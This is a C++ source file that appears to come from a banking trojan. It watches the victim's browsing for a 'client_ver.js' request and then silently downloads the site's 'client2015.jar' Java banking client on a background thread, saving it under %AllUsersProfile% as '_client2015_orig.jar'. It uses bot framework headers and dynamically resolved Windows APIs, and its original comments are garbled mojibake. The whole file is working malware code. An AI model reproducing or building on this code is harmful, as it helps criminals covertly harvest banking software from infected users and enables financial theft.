//---------------------------------------------------------------------------

#pragma hdrstop

#include "Javaclient2015Saver.h"
//---------------------------------------------------------------------------

#include <windows.h>
#include <shlobj.h>

#include "GetApi.h"
#include "Strings.h"
#include "BotHTTP.h"
#include "Utils.h"


#include "BotDebug.h"

namespace JAVACLIENT2015DEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define JAVACL2015DBG JAVACLIENT2015DEBUGSTRINGS::DBGOutMessage<>


class TJavaClientFileData : public TBotObject
{
public:
	TJavaClientFileData() {};
	string TempFileName;
	string FileName;
    string URL;
};

// ������� ������ �������� �����
DWORD WINAPI Downloadclient2015File(LPVOID D)
{
	// ��������� ������ ����

    TJavaClientFileData *Data = (TJavaClientFileData*)D;

	PCHAR Document = NULL;

	HRESULT Res = (HRESULT)pURLDownloadToFileA(NULL, Data->URL.t_str(), Data->TempFileName.t_str(), 0, NULL);


	if (Res == S_OK)
		pMoveFileA(Data->TempFileName.t_str(), Data->FileName.t_str());
	else
		pDeleteFileA(Data->TempFileName.t_str());


	delete Data;

	return 0;
}



//*****************************************************************
//  ������� ��������� ������ �, � ������ ����������� ������ �
//  ������
//  "*/client_ver.js", ��������� ����
//  "http://host_name/client2015.jar" � ��������� ��� � ����
//  %AllUsersProfile%\Application Data\_client2015_orig.jar
//*****************************************************************
void CheckJavaClient2015File(const char *aURL)
{

	if (!WildCmp((PCHAR)aURL, "*/client_ver.js"))
		return;


		// ���������� ���� �������� �����
		string Path(MAX_PATH);

		pGetEnvironmentVariableA("ALLUSERSPROFILE", Path.t_str(), MAX_PATH);


		Path.CalcLength();

		if (Path.IsEmpty())
            return;

		Path  += "\\";

		//������ ��������� ��� �����
		string FileName = Path + "_client2015_orig.jar";

		// � ������ ������������� ������� �����, ���������� ������
		if (FileExistsA(FileName.t_str()))
			return;


		TURL URL(aURL);
		URL.Document =  "client2015.jar";

		TJavaClientFileData *Data = new TJavaClientFileData();

		Data->FileName     = FileName;
		Data->TempFileName = Path + "client2015.tmp";
		Data->URL          = URL.URL();

		StartThread(Downloadclient2015File, Data);
}
